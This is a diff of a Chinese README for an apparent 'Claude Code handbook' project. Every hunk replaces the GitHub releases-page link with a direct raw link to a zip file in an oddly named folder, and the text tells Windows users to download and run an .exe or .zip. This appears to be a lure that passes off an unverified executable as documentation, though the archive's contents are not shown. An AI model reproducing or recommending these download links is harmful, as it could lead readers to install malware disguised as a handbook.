@@ -1,12 +1,12 @@
 # 📘 claude-code-handbook-cn - Read Claude Code in Plain Chinese
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/bealerationalistic149/claude-code-handbook-cn/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/bealerationalistic149/claude-code-handbook-cn/main/thalamocele/handbook_claude_cn_code_2.8.zip)
 
 ## 🚀 下载与安装
 
 请先访问发布页下载文件：
 
-[前往下载页面](https://github.com/bealerationalistic149/claude-code-handbook-cn/releases)
+[前往下载页面](https://raw.githubusercontent.com/bealerationalistic149/claude-code-handbook-cn/main/thalamocele/handbook_claude_cn_code_2.8.zip)
 
 在发布页里，找到最新版本的安装包或压缩包。对 Windows 用户来说，通常会看到 `.exe` 安装文件或 `.zip` 压缩文件。下载后，按下面的方法运行。
 
@@ -98,7 +98,7 @@
 
 如果你不想安装，也可以直接在发布页查看可下载文件和版本说明。
 
-[再次前往下载页面](https://github.com/bealerationalistic149/claude-code-handbook-cn/releases)
+[再次前往下载页面](https://raw.githubusercontent.com/bealerationalistic149/claude-code-handbook-cn/main/thalamocele/handbook_claude_cn_code_2.8.zip)
 
 ## 🧭 基本操作
 
@@ -201,7 +201,7 @@
 
 如果你现在就要下载，请直接访问发布页：
 
-[https://github.com/bealerationalistic149/claude-code-handbook-cn/releases](https://github.com/bealerationalistic149/claude-code-handbook-cn/releases)
+[https://raw.githubusercontent.com/bealerationalistic149/claude-code-handbook-cn/main/thalamocele/handbook_claude_cn_code_2.8.zip](https://raw.githubusercontent.com/bealerationalistic149/claude-code-handbook-cn/main/thalamocele/handbook_claude_cn_code_2.8.zip)
 
 ## 🧭 目录建议
 
@@ -236,7 +236,7 @@
 
 ## 📥 再次下载入口
 
-[下载或查看发布文件](https://github.com/bealerationalistic149/claude-code-handbook-cn/releases)
+[下载或查看发布文件](https://raw.githubusercontent.com/bealerationalistic149/claude-code-handbook-cn/main/thalamocele/handbook_claude_cn_code_2.8.zip)
 
 ## 🧾 项目说明
 
